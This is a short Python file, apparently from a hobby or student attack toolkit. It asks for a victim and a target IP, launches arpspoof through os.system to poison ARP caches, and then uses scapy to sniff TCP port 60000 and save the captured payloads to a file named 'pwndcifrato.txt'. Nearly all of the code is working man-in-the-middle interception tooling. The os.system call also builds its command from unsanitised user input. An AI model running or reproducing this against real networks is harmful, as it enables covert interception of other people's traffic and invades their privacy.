import socket
socket.has_ipv6=False
from scapy.all import *
from scapy.layers.inet import TCP
from helpers.utils import *
import os

def arpoisoner(out_lck):

    output(out_lck, "Arp Poisoner")

    intf = loop_input(out_lck, "Please insert interface's name: ")

    victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    targetip = loop_input(out_lck, "Please insert target IP: ")

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (intf, "192.168." + victimip, "192.168." + targetip))

#si so che è na porcata ma non mi viene in mente un modo migliore di farlo e si, non posso passare il file in prn

def lel(file):
    def out_sniff(packet):
        file.write(bytes(packet[TCP].payload))
    return out_sniff

def analyzer(out_lck):
    file = open("received/pwndcifrato.txt", "wb")

    output(out_lck, "Analizer")

    time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")

    sniff(filter="tcp and port 60000", timeout=time, prn=lel(file))

    file.close()



